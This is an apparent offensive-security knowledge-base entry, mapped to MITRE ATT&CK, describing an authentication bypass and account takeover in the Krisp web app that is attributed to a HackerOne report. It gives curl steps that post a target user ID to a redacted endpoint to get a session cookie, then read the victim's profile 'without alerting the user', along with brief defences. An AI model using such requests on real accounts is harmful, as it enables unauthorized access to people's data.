---
id: proc-krisp-auth-bypass-001
name: Krisp-Auth-Bypass-for-Account-Takeover
tags:
  - auth-bypass
  - account-takeover
  - krisp
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-auth-bypass-krisp]]'
  - '[[commands/curl-account-access-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:42.976Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Valid Accounts]]'
---
# Krisp-Auth-Bypass-for-Account-Takeover

## Summary

This procedure exploits a missing authentication check in a critical function (redacted as ███) of the Krisp web application, allowing an attacker to impersonate any user and take over their account without credentials or user interaction. Reported via HackerOne, this vulnerability enables full compromise of user sessions and data access.

## Description

The Krisp application, a web-based platform, contains a critical function that processes user-specific requests without verifying authentication tokens or session validity. By crafting a direct HTTP request to this endpoint with a target user's ID, an attacker can establish a valid session for that user. This leads to complete account takeover, including access to personal data, settings, and potentially integrated services. The attack requires only knowledge of a target user ID (obtainable via public profiles or enumeration) and direct network access to the application. No user interaction is needed, making it highly dangerous for all users.

## Requirements

1. Network access to the Krisp web application over HTTPS
2. Knowledge of a target user ID (e.g., from public endpoints or enumeration)
3. curl or similar HTTP client for sending requests

## Defense

Defensive measures and detection strategies:

- Implement comprehensive authentication checks on all user-impacting endpoints, including token validation and session binding
- Use rate limiting and IP-based anomaly detection to flag unusual access patterns to sensitive functions
- Monitor for direct API calls without auth headers via web application firewall (WAF) rules

## Objectives

1. Gain unauthorized access to a target user's account via the bypassed function
2. Establish a persistent session for data access and manipulation
3. Demonstrate full compromise without alerting the user

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate the critical function endpoint (███) in the Krisp API, typically documented or discoverable via API exploration tools. No authentication is required for initial probing.

**Command** ([[commands/curl-endpoint-probe]]):
```bash
curl -X GET "<krisp-base-url>/api/███" -H "Content-Type: application/json"
```

> This probe confirms the endpoint responds without auth. Expected output: 200 OK or error indicating missing parameters, but no 401/403 auth denial.

### Step 2: Execute Authentication Bypass

**Context**: Send a POST request to the endpoint with the target user's ID to initiate session hijacking.

**Command** ([[commands/curl-auth-bypass-krisp]]):
```bash
curl -X POST "<krisp-base-url>/api/███" -H "Content-Type: application/json" -d '{"user_id": "<target-user-id>"}' -c cookies.txt
```

> The request bypasses auth due to missing checks, setting a session cookie. Expected output: 200 OK with session data; save cookies for follow-up access.

### Step 3: Verify Account Takeover

**Context**: Use the obtained session to access protected user resources, confirming compromise.

**Command** ([[commands/curl-account-access-test]]):
```bash
curl -b cookies.txt "<krisp-base-url>/api/user/profile" -H "Content-Type: application/json"
```

> Retrieves user profile. Expected output: JSON with target user's sensitive information, verifying takeover.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/curl-auth-bypass-krisp]]
- [[commands/curl-account-access-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[auth-bypass]]
- [[account-takeover]]
